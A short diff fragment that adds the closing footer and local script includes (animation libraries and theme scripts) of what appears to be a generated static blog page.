+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
